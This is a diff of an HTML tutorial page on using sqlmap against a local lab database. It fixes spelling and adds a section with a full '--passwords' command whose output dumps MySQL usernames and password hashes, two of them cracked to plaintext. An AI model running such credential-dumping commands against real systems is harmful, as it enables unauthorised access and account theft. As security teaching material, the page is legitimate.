@@ -27,8 +27,8 @@
     <div class="course-top-level-container">
       <h1 class="title toc">Introduction</h1>
       <p>
-        Whether you want to gain persistent access to a database, escelate
-        priveledges, or steal information from another table unrelated to
+        Whether you want to gain persistent access to a database, escalate privileges, 
+        or steal information from another table unrelated to
         the SQL vulnerable application, stealing the database usernames and
         passwords can be an important next step.
       </p>
@@ -50,12 +50,13 @@
       <p>
         The database banner commonly holds information such as the type and version
         of the database management system, and the patch level. This information
-        can be useful for looking up additional exploites in an exploit database.
+        can be useful for looking up additional exploits  in an exploit database.
       </p>
       <p>
         To retrieve the banner, add the argument <span class="inline-code">
         &ndash;&ndash;banner</span> to a Sqlmap command.
       </p>
+
 <pre class="lang-bash default-code-style dark-mode-background">
 kali@kali:~$ python3 sqlmap.py -u http://127.0.0.1/ <mark>--banner</mark> --forms --batch --random-agent
 
@@ -92,7 +93,7 @@ back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
 <mark>banner: '10.3.34-MariaDB-0+deb10u1'</mark></pre>
       
       <p>
-        Near the bottom of the output we see that the database management system
+        Near the bottom of the output, we see that the database management system
         is <span class="inline-code">MySQL</span>, specifically <span class="inline-code">
         MariaDB</span> which is  a popular MySQL fork, the version of MariaDB is 
         <span class="inline-code">10.3.34</span>, and the specific version of the 
@@ -158,6 +159,50 @@ back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
         case the database is running on <span class="inline-code">localhost</span>
         which means that the database is running on the same server as the
         website.
+      </p>
+      
+      <h1 class="title toc">Enumerate DBMS users password hashes</h1>
+      <p>
+        The argument <span class="inline-code">&ndash;&ndash;passwords</span>
+        is used to enumerate all usernames and password hashes of the database.
+        Sqlmap then proceeds to try to crack the password hashes with a dictionary
+        attack.
+      </p>
+      <p>
+        Below is an example of using Sqlmap to enumerate database usernames and
+        password hashes.
+      </p>
+
+<pre class="lang-bash default-code-style dark-mode-background">
+kali@kali:~$ python3 sqlmap.py -u http://127.0.0.1/ <mark>--passwords</mark> --forms --batch --random-agent
+
+[15:07:58] [INFO] starting dictionary-based cracking (mysql_passwd)
+[15:07:58] [INFO] starting 4 processes
+[15:08:1315:08:13] [] [INFOINFO] cracked password '] current status: alekh... |password' for user 'sammy'
+[15:08:1615:08:16] [] [INFOINFO] cracked password '] current status: brusk... /sql_inject' for user 'sql_inject'
+database management system users password hashes:
+[*] <mark>nimda</mark> [1]:
+    password hash: *968BF9E2F4853B0FD9C5AFC2D2D29050DDD62D8C
+[*] <mark>root</mark> [1]:
+    password hash: NULL
+[*] <mark>sammy</mark> [1]:
+    password hash: *2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
+    clear-text password: password
+[*] <mark>sql_inject</mark> [1]:
+    password hash: *83D5F42526EF6E226CFAD4FE875D017ADF14357C
+    clear-text password: sql_inject</pre>
+
+      <p>
+        Sqlmap was able to find four database users: nimda, root, sammy, and 
+        sql_inject. The password hash for root is <span class="inline-code">NULL</span>.
+        This means that the root account is not password protected, which is a
+        major security posture weakness to take note of. For the other three
+        accounts Sqlmap lists their respective password hashes. Furthermore, 
+        Sqlmap was able to crack two of the password hashes for accounts the
+        accounts sammy and sql_inject. The dictionary attack was not able to 
+        crack nimda's account password, which is why there is no 
+        <span class="inline-code">clear-text password</span> section listed under
+        nimda.
       </p>
 
     </div>
